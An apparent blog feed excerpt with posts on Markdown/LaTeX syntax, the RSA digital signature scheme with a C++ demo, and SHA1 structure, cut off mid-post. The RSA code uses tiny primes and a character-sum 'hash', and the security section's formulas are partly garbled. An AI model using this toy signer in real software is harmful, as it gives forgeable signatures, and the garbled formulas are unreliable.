  <entry>
    <title>Markdown及Latex常用语法的补充</title>
    <link href="https://nonevector.top/posts/15.html"/>
    <id>https://nonevector.top/posts/15.html</id>
    <published>2023-11-18T03:18:37.352Z</published>
    <updated>2023-12-10T10:31:06.839Z</updated>
    
    <content type="html"><![CDATA[<h2 id="括号">括号</h2><h3 id="1-1-各种括号">1.1 各种括号</h3><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$$\langle表达式\rangle$$    ⟨表达式⟩⟨表达式⟩</span><br><span class="line"></span><br><span class="line">$$\lceil表达式\rceil$$           ⌈表达式⌉⌈表达式⌉</span><br><span class="line"></span><br><span class="line">$$\lfloor表达式\rfloor$$      ⌊表达式⌋⌊表达式⌋</span><br><span class="line"></span><br><span class="line">$$\lbrace表达式\rbrace$$   &#123;表达式&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>$$\langle表达式\rangle$$</p><p>$$\lceil表达式\rceil$$</p><p>$$\lfloor表达式\rfloor$$</p><p>$$\lbrace表达式\rbrace$$</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h3 id="1-2-单边括号">1.2 单边括号</h3><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$$</span><br><span class="line">ver<span class="emphasis">_&#123;k1&#125;(m, s) =</span></span><br><span class="line"><span class="emphasis">\begin&#123;cases&#125;</span></span><br><span class="line"><span class="emphasis">True  &amp; 当 s = sign_</span>&#123;k<span class="emphasis">_2&#125; \newline</span></span><br><span class="line"><span class="emphasis">False &amp; 当s \neq sign_</span>&#123;k<span class="emphasis">_2&#125;</span></span><br><span class="line"><span class="emphasis">\end&#123;cases&#125;</span></span><br><span class="line"><span class="emphasis">$$</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>$$<br>ver_{k1}(m, s) =<br>\begin{cases}<br>True  &amp; 当 s = sign_{k_2} \newline<br>False &amp; 当s \neq sign_{k_2}<br>\end{cases}</p><p>$$</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="公式左对齐">公式左对齐</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$$</span><br><span class="line">\begin&#123;aligned&#125;</span><br><span class="line">a &amp;= b + c  \newline</span><br><span class="line">  &amp;= d + e + f \newline</span><br><span class="line">b &amp;= c + d \tag&#123;1.1&#125; \newline</span><br><span class="line">  &amp;= g + h +i \tag&#123;1.2&#125;</span><br><span class="line">\end&#123;aligned&#125;</span><br><span class="line"></span><br><span class="line">$$</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>$$<br>\begin{align}<br>a &amp;= b + c  \newline<br>&amp;= d + e + f \newline<br>b &amp;= c + d \tag{1.1} \newline<br>&amp;= g + h +i \tag{1.2}<br>\end{align}<br>$$</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>]]></content>
    
    
    <summary type="html">个人写blog常用的数学公式及语法大全</summary>
    
    
    
    <category term="随记" scheme="https://nonevector.top/categories/%E9%9A%8F%E8%AE%B0/"/>
    
    
    <category term="Markdown" scheme="https://nonevector.top/tags/Markdown/"/>
    
    <category term="Latex" scheme="https://nonevector.top/tags/Latex/"/>
    
  </entry>
  
  <entry>
    <title>数字签名之RSA签名体制</title>
    <link href="https://nonevector.top/posts/13.html"/>
    <id>https://nonevector.top/posts/13.html</id>
    <published>2023-11-18T02:31:13.581Z</published>
    <updated>2023-12-07T00:56:06.459Z</updated>
    
    <content type="html"><![CDATA[<h2 id="数字签名原理">数字签名原理</h2><p>一个完整的数字签名方案由三部分组成:密钥生成算法、签名算法和验证算法。密钥生成算法是根据系统参数为签名者生成公钥和私钥;签名算法是产生数字签名的某种算法,而验证算法是检验一个数字签名是否有效(即是否由指定实体生成)的某种算法。如无特殊说明,下文继续用 A 代表签名者,B 代表验证者。</p><p>下面给出数字签名的形式化定义:</p><p>(1)密钥生成算法</p><p>系统初始化产生签名方案的基本参数(M,S,K,Sign,Ver),其中 M 为消息空间,S 为签名空间，K 为密钥空间，包含私钥和公钥,Sign 为签名算法集合,Ver 为签名验证算法集合。用户 A 执行密钥生成算法生成自己的公私密钥$(k_1,k_2)$。</p><p>(2)签名算法</p><p>对任意的消息 $m \in M$,有$s=sign_{k_2}(m)$,且$s \in S$,那么 s 为消息的签名,将签名消息组(m,s)发送给签名验证者。</p><p>(3)验证算法</p><p>对于上述的$k_1 \in K$,有相应的签名验证算法:$ver_{k_1}:M \times S \rightarrow \lbrace True,False \rbrace,ver_{k_1} \in Ver$,且</p><p>$$<br>ver_{k1}(m, s) =<br>\begin{cases}<br>True  &amp; 当 s = sign_{k_2} \newline<br>False &amp; 当s \neq sign_{k_2}<br>\end{cases}<br>$$</p><p>签名验证者收到(m,s)后,计算 $ver_{k_1}(m,s)$,若 $ver_{k_1}(m,s)=True$,则签名有效;否则签名无效。</p><p>对于每一个$k \in K$,签名函数$ sign*{k_2}$,和签名验证函数 $ver*{k<em>1}$, 是容易计算的。而验证函数 $ver</em>{k<em>1}$是公开的,同时还要求对任意的消息 m,在未知$k_2$条件下从集合 S 中选取 s 使得 $ver</em>{k_1}(m,s)=True$ 是非常困难的,也就是说,攻击者对消息 m 产生有效的签名 s 是不可能的。</p><p>根据定义,在进行私钥签名前,先进行消息关键信息提取。</p><p>如图 8-1 所示,发送方 A 将消息用 Hash 算法产生一个消息摘要(Message Digest),这个消息摘要有两个重要特性:<strong>抗碰撞性</strong>和<strong>摘要长度</strong>固定,使得任何消息产生的签名值长度是一样的。发送方 A 产生消息摘要后,用自己的私钥对摘要进行加密,这个加密后的消息摘要就是数字签名，随后发送方 A 将消息与签名发给接收方 B。B 接收到消息及其签名后,用发送方 A 的公钥解密这个签名,获得由发送方 A 生成的消息摘要,接着用发送方 A 所用 Hash 算法重新生成所获得消息的摘要,然后比对这两个摘要。如果相同,说明这个签名是发送方 A 针对这个消息的有效签名;如果不相同,则签名无效。</p><p><img src="https://cdn.acwing.com/media/article/image/2023/11/18/169037_8532583f85-1.png" alt="1.png"></p><p>依据上述数字签名的基本原理,人们设计出了众多不同种类的数字签名方案,下面将介绍常用数字签名的实现方案。</p><h2 id="基于-RSA-的签名方案">基于 RSA 的签名方案</h2><p>RSA 签名方案是目前使用较多的一个签名方案,它的安全性是基于大整数因子分解的困难性。RSA 签名方案的密钥生成算法与 RSA 加密方案完全相同。关于 RSA 加密算法我也写了一篇 👉<a href="https://www.nonevector.top/posts/9.html">点击直达</a></p><ol><li><p>密钥生成算法</p><p>首先选取两个满足安全要求的大素数 p 和 q,计算 n=pq,及其欧拉函数 $\varphi(N)=(p-1)(q-1)$。然后随机选取整数$ e(1&lt;e &lt;\varphi(N)$,满足 $gcd(e，\varphi(N))$=1。采用如下方式计算 $d,d \equiv e^{-1}(mod \varphi(N))$,则签名者 A 的公为(n,e),私为 d。p 和 q 是秘密参数,需要保密。如不需要保存,计算出 d 后可销毁 p、q。</p></li><li><p>签名算法<br>设待签名的消息为 $m \in Z_n$.,利用一个安全的 Hash 函数 h 来产生消息摘要 h(m),然后签名者 A 用下面算法计算签名$s \equiv h(m)^d(mod n)$,则 s 是消息 m 的签名。(s,m)发送给 B。</p></li><li><p>验证算法<br>签名接收者 B 收到消息 m 和签名 s 后,首先,利用上述 Hash 函数 h 计算消息摘要 h(m);<br>然后,检验等式$ h(m)mod n \equiv s^e(mod n)$是否成立。若成立,则签名有效;否则,签名无效。</p></li><li><p>正确性<br>证明如果所有算法按步骤执行,则接收者 B 输出签名有效。</p><p>因为</p><p>$$<br>s \equiv h(m)^d(mod \ n),de \equiv 1(mod \ \varphi(n)), \varphi(n) = (p - 1)(q - 1)<br>$$</p><p>所以</p><p>$$<br>\begin{align}<br>s^e \ mod \ n &amp;= h(m)^{ed} \ mod \ n = h(m)^{k \varphi(n) + 1} \ mod \ n = h(m)h(m)^{k \varphi(n) } \ mod \ n \newline<br>&amp;= h(m)[h(m)^{\varphi(n)}]^k \ mod \ n = h(m) \ mod \ n(其中k为整数)<br>\end{align}<br>$$</p><p>注意,如果 h(m)与 n 不互素，上面等式也成立</p></li></ol><h2 id="案例">案例</h2><p>(1)密钥生成算法<br>假设 A 选取 p=13,q=11,e=13,则有 n=pq=143,$\varphi (n)=(p-1)(q-1)=12 \times 10=120$。求解 ed=13d=1(mod 120)得 d=37。因此 A 的公钥为(n=143,e=13);私钥为 d=37。</p><p>(2) 签名算法<br>假定消息 m 的 Hash 值 h(m)=16,则计算 m 签名$s=(m) ^ d \ mod \ n=16^{37} \ mod \ 143= 3$。</p><p>(3)验证算法<br>接收者 B 收到签名后,计算 $s^e  \ mod \ n=3^{13} \  mod \ 143=16,h(m)=16 \equiv s^e \equiv 16(mod \ 143)$成立,因此,B 验证此签名有效。<br>注意，本例旨在说明签名方案的实现过程,为计算方便所选参数均较为简单。在目前实际应用中推荐素数长度至少为 1024 比特。</p><h2 id="C-代码">C++ 代码</h2><blockquote><p>因为数字签名主要的作用是验证而不是加密和解密，所以我这里用的参数比较简单，并且 hash 函数我随便写的，如果需要了解 hash 函数可以去看我写的<a href="https://www.nonevector.top/posts/11.html">MD5 算法</a>和<a href="https://www.nonevector.top/posts/12.html">SHA1 算法</a>.</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sstream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> x first</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> y second</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100010</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line"></span><br><span class="line">string clear_text; <span class="comment">//明文</span></span><br><span class="line">string secret_text; <span class="comment">//密文</span></span><br><span class="line"></span><br><span class="line">LL p, q;<span class="comment">//两个安全大素数</span></span><br><span class="line">LL e, n;<span class="comment">//公钥</span></span><br><span class="line">LL private_key; <span class="comment">//私钥</span></span><br><span class="line">LL Euler;<span class="comment">// 欧拉函数</span></span><br><span class="line">LL sign; <span class="comment">// 数字签名</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> res; <span class="comment">//选择加密还是解密</span></span><br><span class="line"></span><br><span class="line"><span class="function">LL <span class="title">qmi</span><span class="params">(LL a, LL k, LL p)</span> <span class="comment">//快速幂求余数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LL res = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(k)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(k &amp; <span class="number">1</span>) res = (LL)res * a % p;</span><br><span class="line">        k &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">        a = (LL)a * a % p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">LL <span class="title">exgcd</span><span class="params">(LL a, LL b, LL &amp;x, LL &amp;y)</span> <span class="comment">// 欧几里得扩展算法</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!b)</span><br><span class="line">    &#123;</span><br><span class="line">        x = <span class="number">1</span>, y = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    LL d, x1, y1;</span><br><span class="line">    d = <span class="built_in">exgcd</span>(b, a % b, x1, y1);</span><br><span class="line">    x = y1, y = x1 - a / b * y1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">Hash</span><span class="params">(string s)</span> <span class="comment">// 将字符串转为string类型的数字</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i ++) sum += s[i];</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">to_string</span>(sum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encrypt</span><span class="params">(string s)</span> <span class="comment">// 签名</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    string ha = <span class="built_in">Hash</span>(s); <span class="comment">// 随便写的hash函数</span></span><br><span class="line">    LL num = <span class="built_in">stoi</span>(ha);</span><br><span class="line">    LL k, d;</span><br><span class="line">    n = p * q;</span><br><span class="line">    Euler = (p - <span class="number">1</span>) * (q - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exgcd</span>(e, Euler, d, k); <span class="comment">// 利用欧几里得扩展算法获取私钥d</span></span><br><span class="line">    private_key = d;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;公钥（e,n）为：(&quot;</span> &lt;&lt; e &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; n &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; endl &lt;&lt;</span><br><span class="line">    <span class="string">&quot;私钥d为：(&quot;</span> &lt;&lt; private_key &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; endl;</span><br><span class="line">    sign = <span class="built_in">qmi</span>(num, d, n);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;最终发送给B的是明文hash后的值的签名s和明文m为(&quot;</span> &lt;&lt; sign &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; s &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encode</span><span class="params">(LL s, string m)</span> <span class="comment">//解密</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    string ha = <span class="built_in">Hash</span>(m); <span class="comment">// 随便写的hash函数</span></span><br><span class="line">    LL num = <span class="built_in">stoi</span>(ha);</span><br><span class="line">    n = p * q;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(num % n == <span class="built_in">qmi</span>(s, e, n))</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt;<span class="string">&quot;经过验证后签名有效&quot;</span> &lt;&lt;endl;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;经过验证后签名无效&quot;</span> &lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请给出两个大素数p，q和公钥e&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cin &gt;&gt; p &gt;&gt; q &gt;&gt; e;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请输入1选择签名，或者输入2选择验证&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cin &gt;&gt; res;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(res == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;请输入明文&quot;</span> &lt;&lt; endl;</span><br><span class="line">        cin &gt;&gt; clear_text;</span><br><span class="line">        <span class="built_in">encrypt</span>(clear_text);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(res == <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;请输入签名和明文&quot;</span> &lt;&lt; endl;</span><br><span class="line">        cin &gt;&gt; sign &gt;&gt; clear_text;</span><br><span class="line">        <span class="built_in">encode</span>(sign, clear_text);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//签名</span></span><br><span class="line">请给出两个大素数p，q和公钥e</span><br><span class="line"><span class="number">11</span> <span class="number">13</span> <span class="number">13</span></span><br><span class="line">请输入<span class="number">1</span>选择签名，或者输入<span class="number">2</span>选择验证</span><br><span class="line"><span class="number">1</span></span><br><span class="line">请输入明文</span><br><span class="line">a</span><br><span class="line">公钥（e,n）为：(<span class="number">13</span>,<span class="number">143</span>)</span><br><span class="line">私钥d为：(<span class="number">37</span>)</span><br><span class="line">最终发送给B的是明文hash后的值的签名s和明文m为(<span class="number">136</span>,a)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 验证（正确）</span></span><br><span class="line">请给出两个大素数p，q和公钥e</span><br><span class="line"><span class="number">11</span> <span class="number">13</span> <span class="number">13</span></span><br><span class="line">请输入<span class="number">1</span>选择签名，或者输入<span class="number">2</span>选择验证</span><br><span class="line"><span class="number">2</span></span><br><span class="line">请输入签名和明文</span><br><span class="line"><span class="number">136</span> a</span><br><span class="line">经过验证后签名有效</span><br><span class="line"></span><br><span class="line"><span class="comment">// 验证（错误）</span></span><br><span class="line">请给出两个大素数p，q和公钥e</span><br><span class="line"><span class="number">11</span> <span class="number">13</span> <span class="number">13</span></span><br><span class="line">请输入<span class="number">1</span>选择签名，或者输入<span class="number">2</span>选择验证</span><br><span class="line"><span class="number">2</span></span><br><span class="line">请输入签名和明文</span><br><span class="line"><span class="number">1</span> a</span><br><span class="line">经过验证后签名无效</span><br></pre></td></tr></table></figure><h2 id="安全性">安全性</h2><p>从上述 RSA 签名方案中可以看到在签名时使用了 Hash 函数，这个函数的使用较之单纯对消息本身进行签名具有更好的抗攻击性。如果不使用 Hash 函数,则对消息 mm 的签名分别为 S 三 m(mod n),三 m%(mod n)。假设攻击者获得了这两个签名，就可以伪造消息 mim2 的有效签名 S1S2。这是因为,RSA 方案的这种乘特性,有时也称为同态特性,(ss)=sis 三 mm(mod n)(证明参照前面方案正确性的证明)。使用安全的 Hash 函数就可以避免类似这样的攻击，从而提高签名体制的安全性。另外,对于大消息而言,将其映射到固定长度再签名，大大提高其签名和验证的效率。</p><p>此外，RSA 签名方案还存在签名可重用的问题，即对同一消息在不同时刻签名是相同的这个问题可以通过在每次签名中引人不同随机数来解决,在后面提到的数字签名方案中对此解决方法均有所体现。</p>]]></content>
    
    
    <summary type="html">基于RSA算法的签名方案及用C++实现</summary>
    
    
    
    <category term="密码学" scheme="https://nonevector.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
    <category term="RSA算法" scheme="https://nonevector.top/tags/RSA%E7%AE%97%E6%B3%95/"/>
    
    <category term="数字签名" scheme="https://nonevector.top/tags/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/"/>
    
  </entry>
  
  <entry>
    <title>Hash算法之SHA1算法</title>
    <link href="https://nonevector.top/posts/12.html"/>
    <id>https://nonevector.top/posts/12.html</id>
    <published>2023-11-12T02:50:21.576Z</published>
    <updated>2023-11-29T03:35:41.684Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Hash-函数结构">Hash 函数结构</h2><p><code>Hash</code> 函数的一般结构如图<code>6-1</code>所示,称为<strong>Hash 函数迭代结构</strong>，也称为<strong>MD 结构</strong>。它由 Merkle 和 Damgard 分别独立提出,包括 MD5,SHA1 等目前所广泛使用的大多数 Hash 函数都采用这种结构。MD 结构将输人消息分为<code>L</code>个固定长度的分组,每一分组长为<code>b</code>位,最后一个分组包含输入消息的总长度,若最后一个分组不足<code>b</code>位时,需要将其填充为<code>b</code>位。由于输人包含消息的长度,所以攻击者必须找出具有相同散列值且长度相等的两条消息,或者找出两条长度不等但加入消息长度后散列值相同的消息,从而增加了攻击的难度。</p><p><img src="https://cdn.acwing.com/media/article/image/2023/11/11/169037_931668de80-1.png" alt="1.png"></p><p>迭代结构包含一个压缩函数<code>f</code>。压缩函数<code>f</code>有两个输入:一个是前一次迭代的<code>n</code> 位输出,称为链接变量;另一个是消息的<code>b</code>位分组，并产生一个<code> n</code> 位的输出。因为一般来说消息分组长度<code>b</code>大于输出长度<code>n</code>,因此称之为压缩函数。第一次迭代输入的链接变量又称为初值变量,由具体算法指定,最后一次迭代的输出即为散列值。</p><h2 id="SHA1-算法">SHA1 算法</h2><p>1993 年美国国家标准技术研究所 NIST 公布了安全散列算法 SHA0(Secure Hash Algrithm)标准,1995 年 4 月 17 日公布的修改版本称为 SHA1,SHA1 在设计方面大程度上是仿 MD5 的但它对“任意”长度的消息生成 160 比特的消息摘要(MD5 仅仅生成 128 位的),因此抗穷举搜索能力更强。它有 5 个参与运算的 32 位寄存器字，消息分组和填充方式与 MD5 相同,主循环也同样是 4 轮,但每轮进行 20 次操作,包含非线性运算、移位和加法运算非线性函数、加法常数和循环左移操作的设计与 MD5 有一些区别。</p><blockquote><p>说实话和 MD5 大差不差，有兴趣可以先去看我之前写的<a href="https://www.nonevector.top/posts/11.html">MD5 算法</a>,看完 MD5 再看 SHA1 应该就没什么问题</p></blockquote><h2 id="1-SHA1-原理">1.SHA1 原理</h2><p>SHA1 算法的输人是最大长度小于$ 2^{64}$比特的消息,输人消息以<code>512 </code>比特的分组为单位处理,输出是 <code>160</code>比特的消息摘要。图 6-5 显示了处理消息输出消息摘要的整个过程，该过程包含下述步骤。</p><p><img src="https://cdn.acwing.com/media/article/image/2023/11/12/169037_1fd5d26181-1.png" alt="1.png"></p><h3 id="1-附加填充位">1.附加填充位</h3><p>在长度为 <code>K bits</code> 的原始消息数据尾部填充长度为<code>P bits</code>的标识<code>100…0</code>，$1 \leq P  \leq 512 $(即至少要填充1个bit)，使得填充后的消息位数为：$K + P \equiv 448 (mod 512).$然后在消息后附加64 比特的无符号整数，其值为<strong>原始消息的长度</strong>。产生长度为 512 整数倍的消息串并把消息分成长为 512位的消息块$ M_1,M_2,\ldots ,M_N$,因此填充后消息的长度为 512×N 比特。</p><blockquote><p>注意到当 输入字长恰好是 448bit 时，需要填充字长 P= 512 而不是 0</p></blockquote><h3 id="2-初始化链接变量">2.初始化链接变量</h3><p>和 MD5 类似,将 5 个 32 比特的固定数赋给 5 个 32 比特的寄存器 ABCD 和 E 作为第一次迭代的链接变量输人:</p><p>$A=0x67452301,B=0xEFCDAB89,C=0x98BADCFE,D=0x10325476,E=0xC3D2E1F0$</p><blockquote><p>每一个变量给出的数值是高字节存于内存低地址，低字节存于内存高地址，即大端字节序</p><p>注意一个存储单元可以存储两位，当然也是一个字</p></blockquote><table><thead><tr><th><strong>字节序</strong></th><th>存储内容</th></tr></thead><tbody><tr><td>小端序</td><td>Buffer[4] = {0x01234567, 0x89ABCDEF, 0xFEDCBA98, 0x76543210};</td></tr><tr><td>大端序</td><td>Buffer[4] = {0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476};</td></tr></tbody></table><h3 id="3-压缩函数">3.压缩函数</h3><p>以 512 位的分组为单位处理消息 ,4 轮循环的模块,每轮循环由 20 个步骤组成,其逻辑如上图图 6-5 所示。每轮循环使用的步函数相同,不同轮的步函数包含不同的非线性函数(Ch、Parity、Maj、Parity)。步函数的输人除了寄存器 A、B、C、D 和 E 外,还有额外常数 $K_r(1 \leq r \leq 4)$和子消息分组(消息字)$W_t(0 \leq t \leq 79)$,t 为选代的步数，r 为轮数。</p><h3 id="4-循环哈希">4. 循环哈希</h3><p>每轮循环均以当前正在处理的 512 比特消息分组$Y_q$和 160 比特的缓存值 ABCD 和 E 为输人,然后循环更新缓存的内容。最后,寄存器 A、B、C、D、E 的当前值模 $2^{32}$加上此次迭代的输人$CV_q$，产生$CV_{q+1}$。</p><h3 id="5-结果">5.结果</h3><p>得到最终散列值:全部 512 比特数据块处理完毕后,最后输出的就是 160 比特的消息摘要。</p><h2 id="2-SHA1-的步函数">2.SHA1 的步函数</h2><blockquote><p>SHA1 精髓所在，即每一轮 20 个步骤中每一个步骤都在干什么</p></blockquote><p><img src="https://cdn.acwing.com/media/article/image/2023/11/12/169037_11c0ca1c81-2.png" 